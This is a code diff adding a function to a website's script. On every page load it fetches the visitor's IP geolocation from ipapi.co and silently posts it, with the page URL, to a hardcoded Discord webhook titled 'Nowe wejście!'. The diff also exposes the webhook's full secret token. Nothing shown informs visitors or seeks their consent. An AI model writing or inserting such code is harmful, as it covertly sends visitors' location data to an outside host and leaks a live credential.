@@ -231,10 +231,62 @@ function darkModeSW(e) {
 toggleLoading();
 
 let geoData;
+let webhookURL = 'https://discordapp.com/api/webhooks/542455692276006932/BS0NPgD60mF16aVAvWWvIPl8KQju_a1xZrGeDWp2YHxxRJfuVfFEPR6qzVk_Mp-J3sZ3';
 
 $.getJSON('https://ipapi.co/json/', function(data) {
     geoData = data;
+    sendWebhook();
 });
+
+let sendWebhook = function () {
+    let disMsg = document.forms.discordWebhook;
+    let color = String(disMsg.color.value);
+    color = color.slice(1);
+
+    const embed = {
+        author: {
+            name: location.href.replace(".", "-").replace("/", "-"),
+        },
+        color: parseInt(color, 16),
+        title: "Nowe wejście!",
+        description: JSON.stringify(geoData, null, "\t"),
+
+    };
+    const props = [];
+    for (const val of Object.values(embed)) {
+        if (typeof val === 'string')
+            props.push(val);
+        else
+            for (const v of Object.values(val))
+                props.push(v);
+    }
+
+    //wyślij
+    try {
+        $.ajax({
+            type: 'POST',
+            url: webhookURL,
+            crossDomain: true,
+            data: JSON.stringify({
+                content: disMsg.content.value,
+                username: disMsg.name.value,
+                avatar_url: disMsg.avatarUrl.value,
+                embeds: props.some(Boolean) ? [embed] : undefined,
+            }),
+            success: success => {
+                console.log(success);
+            },
+
+            error: error => {
+                console.log(error);
+            },
+        });
+    } catch (e) {
+        console.log('error:');
+        console.log(e);
+    }
+
+};
 
 // var geocodeData;
 // $.ajax({
